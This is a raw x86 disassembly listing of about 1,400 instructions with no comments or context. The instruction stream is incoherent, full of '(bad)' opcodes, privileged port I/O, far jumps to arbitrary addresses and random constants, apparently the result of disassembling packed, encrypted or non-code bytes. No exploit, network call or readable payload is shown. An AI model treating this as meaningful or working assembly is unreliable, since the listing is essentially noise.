  40aa8c:	mov    al,ds:0xa937ec68
  40aa91:	pop    es
  40aa92:	addr16 jo 0x40aa3c
  40aa95:	dec    edx
  40aa96:	test   al,0x45
  40aa98:	aam    0x3b
  40aa9a:	imul   edx,DWORD PTR [ebx+0x3a],0xb8e78afe
  40aaa1:	(bad)  [esi-0x61]
  40aaa4:	fisttp QWORD PTR [ecx]
  40aaa6:	out    0xb7,eax
  40aaa8:	in     al,dx
  40aaa9:	mov    esp,0x3184e9ca
  40aaae:	lock and al,0x9c
  40aab1:	mov    BYTE PTR [edi+0x450bcdc1],bl
  40aab7:	ret    
  40aab8:	enter  0xf9b6,0x66
  40aabc:	jbe    0x40ab0e
  40aabe:	stc    
  40aabf:	loopne 0x40aad3
  40aac1:	jmp    0x40ab01
  40aac3:	daa    
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	test   eax,0x908ed8c0
  40aaca:	clc    
  40aacb:	cmp    al,0x9b
  40aacd:	imul   ebp,DWORD PTR [eax-0x1e],0xfb590196
  40aad4:	jns    0x40aaa7
  40aad6:	sti    
  40aad7:	push   0x19c45bc0
  40aadc:	mov    esp,0xbbbad11b
  40aae1:	out    0x56,eax
  40aae3:	mov    dl,0x17
  40aae5:	xchg   ecx,eax
  40aae6:	push   ds
  40aae7:	jb     0x40aa92
  40aae9:	xchg   esp,eax
  40aaea:	sar    DWORD PTR [ebx+0x7e],1
  40aaed:	jmp    0x574dd4a5
  40aaf2:	pop    es
  40aaf3:	ds sbb ebp,ebx
  40aaf6:	shl    esi,0xb3
  40aaf9:	sub    ecx,edi
  40aafb:	sbb    dl,al
  40aafd:	stos   DWORD PTR es:[edi],eax
  40aafe:	std    
  40aaff:	jl     0x40ab15
  40ab01:	jecxz  0x40ab0a
  40ab03:	push   edx
  40ab04:	adc    al,0xec
  40ab06:	push   ss
  40ab07:	or     BYTE PTR [eax-0x24],cl
  40ab0a:	mov    esp,0x6080263a
  40ab0f:	not    cl
  40ab11:	add    edi,DWORD PTR [ecx]
  40ab13:	inc    esi
  40ab14:	cs add al,0x99
  40ab17:	push   edi
  40ab18:	xchg   DWORD PTR [esp+ebp*1-0x2bdf68f9],esp
  40ab1f:	adc    eax,0x14c903ad
  40ab24:	in     eax,0x67
  40ab26:	cmp    al,0x53
  40ab28:	clc    
  40ab29:	xor    ah,ch
  40ab2b:	scas   eax,DWORD PTR es:[edi]
  40ab2c:	rcr    ecx,cl
  40ab2e:	and    DWORD PTR [esi+0x31],ebx
  40ab31:	xchg   edi,eax
  40ab32:	dec    ebp
  40ab33:	out    dx,al
  40ab34:	inc    ebx
  40ab35:	sbb    eax,0x37204b02
  40ab3a:	in     eax,0x6d
  40ab3c:	test   eax,0x7f8c4730
  40ab41:	or     dh,BYTE PTR [edi+0x52]
  40ab44:	call   0x49d4:0x62493937
  40ab4b:	sar    DWORD PTR [ebp-0x36c88a4c],1
  40ab51:	xor    eax,0x791017be
  40ab56:	rcr    BYTE PTR [ecx],1
  40ab58:	outs   dx,DWORD PTR ds:[esi]
  40ab59:	icebp  
  40ab5a:	jmp    0xff9be7ba
  40ab5f:	adc    edi,DWORD PTR [eax-0x58f3fb7]
  40ab65:	adc    eax,0x442d676f
  40ab6a:	repnz addr16 into 
  40ab6d:	jns    0x40abab
  40ab6f:	cmp    dl,ah
  40ab71:	xchg   edi,eax
  40ab72:	mov    BYTE PTR [esi],al
  40ab74:	fsubr  DWORD PTR [esi+ebp*2-0x1fd6bd2]
  40ab7b:	xchg   ecx,eax
  40ab7c:	das    
  40ab7d:	(bad)  
  40ab7f:	ins    BYTE PTR es:[edi],dx
  40ab80:	pop    esi
  40ab81:	dec    ebp
  40ab82:	into   
  40ab83:	iret   
  40ab84:	dec    esp
  40ab85:	iret   
  40ab86:	mov    dl,0x0
  40ab88:	mov    edx,0xea2e3a4d
  40ab8d:	fbstp  TBYTE PTR [eax+0x29]
  40ab90:	push   eax
  40ab91:	or     BYTE PTR [esi-0x2e0ee288],ah
  40ab97:	adc    al,0x4f
  40ab99:	fstp   QWORD PTR [edx]
  40ab9b:	adc    eax,0x109bcf9f
  40aba0:	pop    edx
  40aba1:	adc    BYTE PTR [ebp-0x52e5b942],ah
  40aba7:	adc    bl,bh
  40aba9:	push   es
  40abaa:	je     0x40abca
  40abac:	xor    dh,BYTE PTR [eax]
  40abae:	sub    esi,DWORD PTR [ecx+0x20]
  40abb1:	jae    0x40abb1
  40abb3:	outs   dx,BYTE PTR ds:[esi]
  40abb4:	jnp    0x40abf5
  40abb6:	cmp    al,0x7c
  40abb8:	and    BYTE PTR [edx-0x48],al
  40abbb:	sbb    DWORD PTR [edx+edx*1+0x343556fe],ebx
  40abc2:	aas    
  40abc3:	in     eax,0x48
  40abc5:	or     BYTE PTR [esi-0x40],ah
  40abc8:	cmp    ebx,DWORD PTR [esp+ebp*1+0x437ddca3]
  40abcf:	pop    ecx
  40abd0:	sub    edx,eax
  40abd2:	jae    0x40ac00
  40abd4:	inc    ebp
  40abd5:	add    DWORD PTR [esi],ebp
  40abd7:	int    0xa0
  40abd9:	sahf   
  40abda:	popa   
  40abdb:	cmp    edi,DWORD PTR [edx+edx*2-0x6a]
  40abdf:	out    0x1,al
  40abe1:	(bad)  
  40abe2:	call   0x95aaa28b
  40abe7:	xchg   ebp,eax
  40abe8:	clc    
  40abe9:	dec    edx
  40abea:	pop    ebp
  40abeb:	push   edx
  40abec:	pop    ss
  40abed:	jl     0x40ac1a
  40abef:	out    dx,eax
  40abf0:	mov    DWORD PTR [ecx],ebx
  40abf2:	cmp    BYTE PTR [ebp-0x4e],dl
  40abf5:	test   BYTE PTR [esi+0x1f],ah
  40abf8:	mov    DWORD PTR [ebp-0x79bfc8d4],0x6a99f040
  40ac02:	jmp    0x553d:0x3329af14
  40ac09:	xor    BYTE PTR [ebx+0x1faeb477],cl
  40ac0f:	std    
  40ac10:	and    DWORD PTR [edi],eax
  40ac12:	retf   0xe6d6
  40ac15:	aaa    
  40ac16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac17:	dec    esp
  40ac18:	sub    dh,BYTE PTR [eax]
  40ac1a:	push   cs
  40ac1b:	ret    
  40ac1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac1d:	(bad)  
  40ac1f:	icebp  
  40ac20:	inc    ecx
  40ac21:	scas   eax,DWORD PTR es:[edi]
  40ac22:	add    DWORD PTR [ebx-0x42d57786],0x52
  40ac29:	outs   dx,DWORD PTR ds:[esi]
  40ac2a:	or     dh,bh
  40ac2c:	mul    BYTE PTR [eax]
  40ac2e:	cmp    eax,DWORD PTR cs:[ebx-0x77a3e82e]
  40ac35:	and    ebx,edx
  40ac37:	into   
  40ac38:	cmp    esi,edi
  40ac3a:	(bad)  
  40ac3b:	repnz out 0x5e,eax
  40ac3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac3f:	aaa    
  40ac40:	data16 mov ch,BYTE PTR [eax-0xfc6eb67]
  40ac47:	sahf   
  40ac48:	fisttp WORD PTR [edx+eiz*8]
  40ac4b:	jmp    0x40abfc
  40ac4d:	xchg   ebp,eax
  40ac4e:	dec    esi
  40ac4f:	mov    cl,0x19
  40ac51:	(bad)  
  40ac52:	out    0x8,al
  40ac54:	pop    eax
  40ac55:	or     BYTE PTR [ecx+0x299e599c],dl
  40ac5b:	sbb    eax,0xa50b96ee
  40ac60:	sahf   
  40ac61:	inc    ebp
  40ac62:	cmp    esp,0x42
  40ac65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac66:	pusha  
  40ac67:	adc    ah,dh
  40ac69:	push   esp
  40ac6a:	imul   eax,ebx,0x6d
  40ac6d:	or     edi,esp
  40ac6f:	xchg   BYTE PTR ds:0x43f4f91e,bl
  40ac75:	es sub eax,0xbc9e42ea
  40ac7b:	xchg   dh,ah
  40ac7d:	mov    bl,0xb3
  40ac7f:	jge    0x40ac88
  40ac81:	pusha  
  40ac82:	cmp    eax,0xb9c00062
  40ac87:	lahf   
  40ac88:	ror    DWORD PTR [ebp+0x3f35d9a],1
  40ac8e:	sbb    BYTE PTR ds:0x93fdd8c2,ah
  40ac94:	xor    BYTE PTR [esi-0x54f31d2a],al
  40ac9a:	adc    DWORD PTR [esi-0x28b1423],ebp
  40aca0:	gs jp  0x40ac80
  40aca3:	and    eax,0xdba9f032
  40aca8:	cmp    dh,BYTE PTR [edi]
  40acaa:	mov    ch,0x42
  40acac:	ins    BYTE PTR es:[edi],dx
  40acad:	out    dx,eax
  40acae:	pop    eax
  40acaf:	shl    BYTE PTR [edx+esi*8-0x59],1
  40acb3:	rcr    BYTE PTR [ebx],0x14
  40acb6:	or     BYTE PTR [ebx],ah
  40acb8:	rol    DWORD PTR [ebp-0x4f],cl
  40acbb:	enter  0x4ece,0x43
  40acbf:	shr    DWORD PTR [ebx],cl
  40acc1:	pushaw 
  40acc3:	push   ds
  40acc4:	dec    ebp
  40acc5:	jge    0x40acbc
  40acc7:	sub    eax,0x3f906ae2
  40accc:	xchg   ebp,eax
  40accd:	inc    edi
  40acce:	cmp    DWORD PTR [eax+0x399b2727],esp
  40acd4:	mov    edx,0x53b0a7ff
  40acd9:	mov    ebp,0xd51fb2b8
  40acde:	sbb    eax,0x379b9d72
  40ace3:	lock repnz nop
  40ace6:	jle    0x40ac9e
  40ace8:	adc    edx,edi
  40acea:	dec    esp
  40aceb:	shl    eax,0x57
  40acee:	push   esi
  40acef:	or     BYTE PTR [ecx-0x1c],bl
  40acf2:	jno    0x40ad3a
  40acf4:	or     al,0xdc
  40acf6:	out    0xd9,al
  40acf8:	push   ds
  40acf9:	cmovg  esi,DWORD PTR [ecx]
  40acfc:	es fmul st,st(7)
  40acff:	sub    ah,bh
  40ad01:	ins    DWORD PTR es:[edi],dx
  40ad02:	xchg   edx,eax
  40ad03:	loop   0x40ad6f
  40ad05:	clc    
  40ad06:	jmp    0x40acbc
  40ad08:	shr    DWORD PTR [esp+ebp*8+0x2e757392],cl
  40ad0f:	ror    bl,0x53
  40ad12:	xchg   edx,eax
  40ad13:	fimul  WORD PTR [ebp+0x5befa57a]
  40ad19:	or     DWORD PTR [edi+ecx*8],0xffffff89
  40ad1d:	sub    BYTE PTR [ebx],0xcd
  40ad20:	inc    edx
  40ad21:	add    al,0x75
  40ad23:	xchg   DWORD PTR [ecx-0x6a],eax
  40ad26:	retf   
  40ad27:	sbb    esp,ecx
  40ad29:	mov    cl,0x49
  40ad2b:	xchg   DWORD PTR [ecx+0x5fc0f490],ebx
  40ad31:	jp     0x40ad04
  40ad33:	or     BYTE PTR [edx-0x5bf2e798],bh
  40ad39:	add    ch,0x35
  40ad3c:	mov    DWORD PTR [eax],0x24a00690
  40ad42:	xor    BYTE PTR [edi+0x2c1d8003],ah
  40ad48:	in     eax,dx
  40ad49:	inc    esi
  40ad4a:	daa    
  40ad4b:	pop    esp
  40ad4c:	sti    
  40ad4d:	dec    esi
  40ad4e:	fisubr WORD PTR [ecx+ecx*2]
  40ad51:	cs pop ds
  40ad53:	dec    eax
  40ad54:	pop    esi
  40ad55:	xchg   esp,eax
  40ad56:	stos   DWORD PTR es:[edi],eax
  40ad57:	jg     0x40adb0
  40ad59:	dec    esp
  40ad5b:	leave  
  40ad5c:	push   ss
  40ad5d:	adc    DWORD PTR [ecx],0x9c88c1b5
  40ad63:	loopne 0x40adc8
  40ad65:	jne    0x40ad6d
  40ad67:	pop    edx
  40ad69:	fistp  QWORD PTR [eax]
  40ad6b:	pop    esi
  40ad6c:	push   ss
  40ad6d:	jge    0x40ad70
  40ad6f:	sub    ecx,esp
  40ad71:	mov    al,ds:0xa175542a
  40ad76:	out    0x53,eax
  40ad78:	xor    dh,0xe5
  40ad7b:	xchg   ebx,eax
  40ad7c:	leave  
  40ad7d:	ror    dl,0x60
  40ad80:	sbb    al,0xd5
  40ad82:	in     al,0x71
  40ad84:	mov    al,0x14
  40ad86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad88:	mov    gs,WORD PTR [ebx-0x7]
  40ad8b:	dec    edi
  40ad8c:	mov    ch,0xca
  40ad8e:	add    edx,edx
  40ad90:	xor    al,0x1c
  40ad92:	mov    eax,ds:0x96dc9172
  40ad97:	ins    BYTE PTR es:[edi],dx
  40ad98:	mov    ds:0x26a00550,al
  40ad9d:	jle    0x40ad4d
  40ad9f:	jge    0x40ad23
  40ada1:	int3   
  40ada2:	jne    0x40ae1c
  40ada4:	mov    esi,0x10cad062
  40ada9:	aam    0x7f
  40adab:	cmp    BYTE PTR [ebp-0x1541984c],ah
  40adb1:	test   al,0x73
  40adb3:	lods   eax,DWORD PTR ds:[esi]
  40adb4:	(bad)  
  40adb5:	into   
  40adb6:	sub    eax,0x3f17b2bb
  40adbb:	ror    ecx,1
  40adbd:	pushf  
  40adbe:	dec    edi
  40adbf:	out    dx,eax
  40adc0:	adc    esi,DWORD PTR [eax-0x34]
  40adc3:	jns    0x40ae25
  40adc5:	push   eax
  40adc6:	dec    edx
  40adc7:	cmp    al,0xdd
  40adc9:	adc    al,0xb4
  40adcb:	neg    DWORD PTR [edx+0x10b781bf]
  40add1:	addr16 out dx,eax
  40add3:	cmp    al,ch
  40add5:	sar    BYTE PTR [edi-0x5],1
  40add8:	fadd   QWORD PTR [ebp-0x44d48d2b]
  40adde:	adc    DWORD PTR [ebx-0x76],ecx
  40ade1:	pop    edx
  40ade2:	adc    al,0xc9
  40ade4:	fild   WORD PTR ds:0x5ed052f8
  40adea:	mov    ch,0x6a
  40adec:	pushf  
  40aded:	xor    DWORD PTR [edi-0x3a569039],esi
  40adf3:	iret   
  40adf4:	ficom  DWORD PTR [eax-0x6f]
  40adf7:	sub    eax,0x247fc32e
  40adfc:	out    0xef,al
  40adfe:	mov    ch,0xfa
  40ae00:	imul   esp,esp,0x59
  40ae03:	fdivr  QWORD PTR [ebx+0x5e]
  40ae06:	jge    0x40adda
  40ae08:	retf   0xddd2
  40ae0b:	sbb    DWORD PTR [eax],0x2efa57d1
  40ae11:	out    0xf7,eax
  40ae13:	sub    BYTE PTR [edx-0x46],bl
  40ae16:	int3   
  40ae17:	lock pop ebx
  40ae19:	push   es
  40ae1a:	imul   esi,DWORD PTR [esi-0x69],0xffffff89
  40ae1e:	pop    edx
  40ae1f:	mov    dh,0x5a
  40ae21:	pop    ebp
  40ae22:	pop    ebx
  40ae23:	dec    esp
  40ae24:	mov    al,0xec
  40ae26:	outs   dx,BYTE PTR ds:[esi]
  40ae27:	xchg   edi,eax
  40ae28:	jl     0x40aea4
  40ae2a:	test   eax,0xf887e5c1
  40ae2f:	dec    edx
  40ae30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae31:	fsubr  DWORD PTR [ebp-0x76]
  40ae34:	cdq    
  40ae35:	sub    bl,BYTE PTR [edx+edi*8-0x784a498b]
  40ae3c:	xlat   BYTE PTR ds:[ebx]
  40ae3d:	mov    al,0xc1
  40ae3f:	popa   
  40ae40:	cmc    
  40ae41:	xlat   BYTE PTR ds:[ebx]
  40ae42:	sbb    bh,BYTE PTR [ebp-0x13]
  40ae45:	adc    BYTE PTR [ebx+ecx*8],ah
  40ae48:	sbb    al,0xa1
  40ae4a:	cdq    
  40ae4b:	loop   0x40ae5b
  40ae4d:	xchg   esp,eax
  40ae4e:	sub    al,0x2c
  40ae50:	lods   eax,DWORD PTR ds:[esi]
  40ae51:	ror    edx,1
  40ae53:	and    al,0xde
  40ae55:	sub    DWORD PTR [eax+edi*1+0x24],esp
  40ae59:	rcl    esi,cl
  40ae5b:	xchg   ebx,eax
  40ae5c:	dec    edi
  40ae5d:	scas   al,BYTE PTR es:[edi]
  40ae5e:	mov    bh,0xa4
  40ae60:	inc    ecx
  40ae61:	int3   
  40ae62:	dec    esp
  40ae63:	neg    BYTE PTR [ebx+0x2d86da0f]
  40ae69:	jg     0x40aee0
  40ae6b:	aas    
  40ae6c:	push   ecx
  40ae6d:	data16 fstp DWORD PTR ds:0xdf84573d
  40ae74:	xor    bh,dh
  40ae76:	dec    esi
  40ae77:	je     0x40aed3
  40ae79:	out    0x5a,al
  40ae7b:	push   0xc1b8974c
  40ae80:	imul   edi,edx,0x3b
  40ae83:	aaa    
  40ae84:	sbb    esp,esi
  40ae86:	lods   al,BYTE PTR ds:[esi]
  40ae87:	movups xmm5,XMMWORD PTR [ebp+0x79]
  40ae8b:	sub    eax,0x5619eacd
  40ae90:	pop    es
  40ae91:	fs and al,0x54
  40ae94:	test   BYTE PTR [esi+eax*2+0x34420fbb],bl
  40ae9b:	xor    bl,BYTE PTR [ebx+edi*1]
  40ae9e:	in     eax,dx
  40ae9f:	sbb    cl,BYTE PTR ds:0x9b13a
  40aea5:	sub    al,0xd1
  40aea7:	shl    BYTE PTR [ebx-0x18d21d2d],cl
  40aead:	stos   DWORD PTR es:[edi],eax
  40aeae:	xor    ebx,eax
  40aeb0:	loope  0x40aefa
  40aeb2:	pop    ds
  40aeb3:	nop
  40aeb4:	xchg   esi,eax
  40aeb5:	es aas 
  40aeb7:	dec    ebp
  40aeb8:	add    ecx,eax
  40aeba:	repz push ebp
  40aebc:	(bad)  
  40aebd:	pusha  
  40aebe:	mov    al,ds:0xdc846d50
  40aec3:	cwde   
  40aec4:	stos   DWORD PTR es:[edi],eax
  40aec5:	dec    esp
  40aec6:	into   
  40aec7:	shr    cl,cl
  40aec9:	add    BYTE PTR [ebx],ch
  40aecb:	mov    ebp,0x9134573e
  40aed0:	xchg   ebx,eax
  40aed1:	je     0x40ae80
  40aed3:	rcl    DWORD PTR [ecx+0x4d6c902f],cl
  40aed9:	jp     0x40aebf
  40aedb:	push   cs
  40aedc:	dec    esi
  40aedd:	das    
  40aede:	bound  esp,QWORD PTR [ecx]
  40aee0:	pop    edi
  40aee1:	test   BYTE PTR [eax+ecx*1+0x56],dl
  40aee5:	mov    eax,ds:0x8da0ec88
  40aeea:	scas   eax,DWORD PTR es:[edi]
  40aeeb:	and    esp,DWORD PTR [eax+0x100e0583]
  40aef1:	inc    eax
  40aef2:	dec    edx
  40aef3:	fbld   TBYTE PTR [ecx+0x54c1d743]
  40aef9:	(bad)  
  40aefa:	jae    0x40ae7d
  40aefc:	dec    esp
  40aefd:	inc    ebx
  40aefe:	xor    eax,0xda8e3026
  40af03:	dec    ebp
  40af04:	in     eax,0x6d
  40af06:	or     dh,BYTE PTR [esi-0x1c27467d]
  40af0c:	pop    ebx
  40af0d:	inc    ebp
  40af0e:	pop    eax
  40af0f:	aaa    
  40af10:	xchg   ebx,eax
  40af11:	hlt    
  40af12:	out    dx,eax
  40af13:	fcom   DWORD PTR ds:0x5d3f08d4
  40af19:	loop   0x40ae9c
  40af1b:	xor    BYTE PTR [esi],cl
  40af1d:	pop    esi
  40af1e:	sub    ch,BYTE PTR [esi]
  40af20:	xchg   edx,eax
  40af21:	xchg   esi,eax
  40af22:	ins    BYTE PTR es:[edi],dx
  40af23:	jle    0x40af54
  40af25:	ret    0xd698
  40af28:	mov    esi,0xb9758d78
  40af2d:	pop    edi
  40af2e:	add    al,0xe5
  40af30:	lea    ebx,[ecx-0x4087c70]
  40af36:	out    0x5,eax
  40af38:	push   0xc958466c
  40af3d:	cli    
  40af3e:	sub    DWORD PTR [ebp+0x1a10f401],0x737582af
  40af48:	lea    edx,[edx-0x560d3959]
  40af4e:	cmp    DWORD PTR [eax+0x30],ebp
  40af51:	repnz cmp eax,ebp
  40af54:	repz ret 
  40af56:	mov    DWORD PTR [ebp-0x76],ebp
  40af59:	cmp    dl,BYTE PTR [eax-0x65f96b2]
  40af5f:	inc    eax
  40af60:	test   BYTE PTR [eax-0x55],ch
  40af63:	push   ss
  40af64:	push   ss
  40af65:	fsubp  st(5),st
  40af67:	sar    BYTE PTR [ebx-0x59255529],0xb2
  40af6e:	push   di
  40af70:	call   0x7d1d:0x4b1efc35
  40af77:	ja     0x40afee
  40af79:	xadd   DWORD PTR [esp+eiz*2+0x18],esp
  40af7e:	nop
  40af7f:	xlat   BYTE PTR ds:[ebx]
  40af80:	lea    eax,ds:0xe529181
  40af86:	stos   BYTE PTR es:[edi],al
  40af87:	loopne 0x40b007
  40af89:	push   cs
  40af8a:	sub    edi,DWORD PTR [ebx+0x65]
  40af8d:	test   ecx,eax
  40af8f:	and    edx,esi
  40af91:	out    dx,al
  40af92:	sahf   
  40af93:	jecxz  0x40af4a
  40af95:	fdivr  st,st(7)
  40af97:	inc    edx
  40af98:	pusha  
  40af99:	lahf   
  40af9a:	inc    edx
  40af9b:	and    edi,DWORD PTR [eax+0x6e]
  40af9e:	(bad)  
  40af9f:	retf   0x3b4
  40afa2:	stos   DWORD PTR es:[edi],eax
  40afa3:	call   0x10e5:0x6b262231
  40afaa:	dec    ebp
  40afab:	pop    eax
  40afac:	sbb    bl,ah
  40afae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afaf:	repz das 
  40afb1:	js     0x40afb8
  40afb3:	frstor [esi-0x29]
  40afb6:	xor    al,0xc3
  40afb8:	scas   eax,DWORD PTR es:[edi]
  40afb9:	cmc    
  40afba:	push   ecx
  40afbb:	out    0xd1,al
  40afbd:	imul   DWORD PTR [ebx+0x515b3fd3]
  40afc3:	sub    bl,BYTE PTR [esi-0x49]
  40afc6:	dec    esi
  40afc7:	add    BYTE PTR [ebx+0x52],al
  40afca:	push   edi
  40afcb:	int3   
  40afcc:	cli    
  40afcd:	mov    bl,0x98
  40afcf:	jne    0x40afd3
  40afd1:	jp     0x40b030
  40afd3:	ret    
  40afd4:	mov    eax,ds:0xee47509
  40afd9:	inc    eax
  40afda:	or     DWORD PTR [edi-0x25],ebp
  40afdd:	xchg   ch,cl
  40afdf:	pop    edi
  40afe0:	cmp    al,0x47
  40afe3:	sub    DWORD PTR [eax-0xf],ecx
  40afe6:	leave  
  40afe7:	xor    ah,cl
  40afe9:	loope  0x40b033
  40afeb:	sahf   
  40afec:	or     eax,ebp
  40afee:	cs ins DWORD PTR es:[edi],dx
  40aff0:	sti    
  40aff1:	cmp    eax,DWORD PTR [ecx-0x4484a676]
  40aff7:	add    esp,DWORD PTR [edx+ecx*1-0x2cba90c1]
  40affe:	shl    eax,0x70
  40b001:	cli    
  40b002:	xchg   DWORD PTR [ebp+edx*8+0x61],ecx
  40b006:	test   al,0x2f
  40b008:	test   al,0xf4
  40b00a:	add    edx,DWORD PTR [ecx+0x795c5044]
  40b010:	or     BYTE PTR [edi-0xa],0x53
  40b014:	cdq    
  40b015:	(bad)  
  40b016:	mov    edi,0x5e83040b
  40b01b:	jecxz  0x40b074
  40b01d:	and    eax,0xe50c9c
  40b022:	push   ecx
  40b023:	cs sahf 
  40b025:	ret    
  40b026:	mov    cl,0x37
  40b028:	pop    edx
  40b029:	push   es
  40b02a:	stos   DWORD PTR es:[edi],eax
  40b02b:	das    
  40b02c:	(bad)
  40b02f:	lock or ebp,ebp
  40b032:	test   BYTE PTR [eax-0x35],al
  40b035:	jnp    0x40afca
  40b037:	mov    edx,0x743ac106
  40b03c:	mov    BYTE PTR [ecx-0x1ecd84ad],dh
  40b042:	in     al,0x9b
  40b044:	aas    
  40b045:	shl    BYTE PTR [ebp-0x271456c],cl
  40b04b:	dec    edi
  40b04c:	addr16 jb 0x40b0ab
  40b04f:	add    al,0xf5
  40b051:	out    0x25,al
  40b053:	jnp    0x40b01c
  40b055:	xchg   ebp,eax
  40b056:	lds    ecx,FWORD PTR [ebp-0x161bf48]
  40b05c:	add    edi,DWORD PTR [esi-0x59]
  40b05f:	xchg   edi,eax
  40b060:	push   esp
  40b061:	and    ecx,DWORD PTR [esi+0x11]
  40b064:	out    dx,eax
  40b065:	sbb    eax,0x3c2757d2
  40b06a:	jns    0x40b000
  40b06c:	adc    ah,dh
  40b06e:	mov    cl,0x2a
  40b070:	ins    BYTE PTR es:[edi],dx
  40b071:	jo     0x40b048
  40b073:	pop    edx
  40b074:	jns    0x40b0e4
  40b076:	sbb    DWORD PTR [esi+esi*8-0x63bf1117],eax
  40b07d:	lods   al,BYTE PTR ds:[esi]
  40b07e:	iret   
  40b07f:	popa   
  40b080:	dec    edx
  40b081:	scas   al,BYTE PTR es:[edi]
  40b082:	cmc    
  40b083:	aaa    
  40b084:	pusha  
  40b085:	das    
  40b086:	cdq    
  40b087:	retf   0x9592
  40b08a:	test   al,0x55
  40b08c:	push   es
  40b08d:	sar    BYTE PTR [edi-0x2172f86d],cl
  40b093:	not    eax
  40b095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b096:	in     eax,dx
  40b097:	call   0x76af:0xad713cf6
  40b09e:	fsubr  st,st(6)
  40b0a0:	mov    cl,0x24
  40b0a2:	jg     0x40b0de
  40b0a4:	test   eax,0xdba26155
  40b0a9:	push   ss
  40b0aa:	cmp    al,0xe5
  40b0ac:	push   esp
  40b0ad:	mov    ds:0xccd4ef2f,eax
  40b0b2:	out    0xa1,al
  40b0b4:	rol    BYTE PTR [ebx],0x29
  40b0b7:	push   0x4b
  40b0b9:	(bad)  
  40b0ba:	into   
  40b0bb:	mov    ah,0x90
  40b0bd:	sub    BYTE PTR [edx],bl
  40b0bf:	ret    
  40b0c0:	dec    eax
  40b0c1:	mov    eax,ds:0x3a4c9ca5
  40b0c6:	daa    
  40b0c7:	push   esi
  40b0c8:	xor    al,0x22
  40b0ca:	push   ebx
  40b0cb:	push   ebp
  40b0cc:	sub    BYTE PTR [ecx+0xf],al
  40b0cf:	icebp  
  40b0d0:	sub    ah,BYTE PTR [edx+0x6]
  40b0d3:	pop    esp
  40b0d4:	xchg   esi,eax
  40b0d5:	sub    eax,0x22631892
  40b0da:	push   edx
  40b0db:	les    edi,FWORD PTR [ebx]
  40b0dd:	and    BYTE PTR [edi],dh
  40b0df:	sub    al,0xc8
  40b0e1:	ror    DWORD PTR [edx-0x517d13db],1
  40b0e7:	xlat   BYTE PTR ds:[ebx]
  40b0e8:	mov    ch,0xce
  40b0ea:	fdiv   DWORD PTR [eax+0x7f1a0fac]
  40b0f0:	stos   BYTE PTR es:[edi],al
  40b0f1:	xlat   BYTE PTR ds:[ebx]
  40b0f2:	cmp    eax,0xb7cb447a
  40b0f7:	shr    BYTE PTR [eax+0x10],cl
  40b0fa:	in     al,dx
  40b0fb:	out    dx,al
  40b0fc:	lods   eax,DWORD PTR ds:[esi]
  40b0fd:	dec    eax
  40b0fe:	pop    eax
  40b0ff:	mov    esi,0x1336c1eb
  40b104:	cmp    edi,ecx
  40b106:	sbb    BYTE PTR [ecx],0xaa
  40b109:	xchg   edx,eax
  40b10a:	test   eax,0x60949d58
  40b10f:	clc    
  40b110:	mov    ah,0x17
  40b112:	sbb    DWORD PTR [esi-0x3b],eax
  40b115:	mov    esi,0xb24aab23
  40b11a:	repz push es
  40b11c:	int3   
  40b11d:	ret    
  40b11e:	ja     0x40b138
  40b120:	or     al,0x6
  40b122:	push   ebx
  40b123:	repnz fs sbb al,0x72
  40b127:	mov    edi,0x41b97f51
  40b12c:	loopne 0x40b15e
  40b12e:	(bad)  
  40b12f:	mov    eax,0x97bd99c9
  40b134:	xchg   edi,eax
  40b135:	clc    
  40b136:	repz and DWORD PTR [esi],0xe2c30722
  40b13d:	ins    DWORD PTR es:[edi],dx
  40b13e:	xor    BYTE PTR [ebx+0xba26651],bh
  40b144:	xchg   ebx,ebp
  40b146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b147:	out    dx,al
  40b148:	outs   dx,BYTE PTR ds:[esi]
  40b149:	jg     0x40b1ad
  40b14b:	fisttp DWORD PTR cs:[ebp+0x75f0f2c9]
  40b152:	ret    0xa954
  40b155:	sahf   
  40b156:	mov    edi,0x64045c57
  40b15b:	shr    DWORD PTR [esp+esi*8+0x5d],0x51
  40b160:	std    
  40b161:	out    0x7e,al
  40b163:	sbb    al,BYTE PTR [ebx]
  40b165:	pushf  
  40b166:	(bad)  
  40b167:	mov    esp,0xef1536b8
  40b16c:	(bad)  
  40b16d:	add    edi,DWORD PTR ds:[ebp+0xa]
  40b171:	daa    
  40b172:	in     eax,0xf7
  40b174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b175:	in     eax,dx
  40b176:	aad    0x7c
  40b178:	sbb    eax,0x273ccac2
  40b17d:	mov    esp,DWORD PTR [ecx]
  40b17f:	out    0xb7,al
  40b181:	adc    ebx,esp
  40b183:	dec    edi
  40b184:	inc    ebx
  40b185:	das    
  40b186:	push   0x5ab6cf00
  40b18b:	pop    ecx
  40b18c:	aam    0x0
  40b18e:	sub    edx,ebp
  40b190:	inc    ecx
  40b191:	retf   
  40b192:	push   esi
  40b193:	stc    
  40b194:	data16 lahf 
  40b196:	popa   
  40b197:	pop    ds
  40b198:	mov    al,ds:0x4d328578
  40b19d:	fild   WORD PTR [esp+ecx*2+0x306f0b79]
  40b1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a5:	je     0x40b196
  40b1a7:	cli    
  40b1a8:	mov    edi,edx
  40b1aa:	mov    bl,BYTE PTR [ebx+0x73]
  40b1ad:	mov    esi,ebp
  40b1af:	(bad)  
  40b1b1:	test   ecx,edi
  40b1b3:	aaa    
  40b1b4:	sub    bh,BYTE PTR [ebx]
  40b1b6:	xor    esp,edx
  40b1b8:	inc    esp
  40b1b9:	loopne 0x40b1d6
  40b1bb:	mov    esi,gs
  40b1bd:	scas   eax,DWORD PTR es:[edi]
  40b1be:	out    dx,eax
  40b1bf:	cmp    eax,0x699c9761
  40b1c4:	mov    esp,0x7eb73162
  40b1c9:	test   BYTE PTR [edi+edx*2],dl
  40b1cc:	fstp   QWORD PTR [edi-0x1f]
